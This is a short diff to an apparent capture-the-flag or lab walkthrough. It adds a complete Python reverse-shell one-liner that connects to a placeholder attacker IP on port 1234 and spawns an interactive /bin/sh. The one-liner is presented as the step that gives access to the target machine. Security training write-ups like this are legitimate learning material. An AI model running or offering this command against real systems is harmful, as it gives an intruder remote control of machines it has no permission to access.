@@ -58,4 +58,8 @@ And we got the shell
 
 Now we can use any reverse shell to get access of the machine
 
-![]()
+**I have used the python reverse shell**
+
+Simply execute the reverse shell </br>
+* `<python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'>`
+
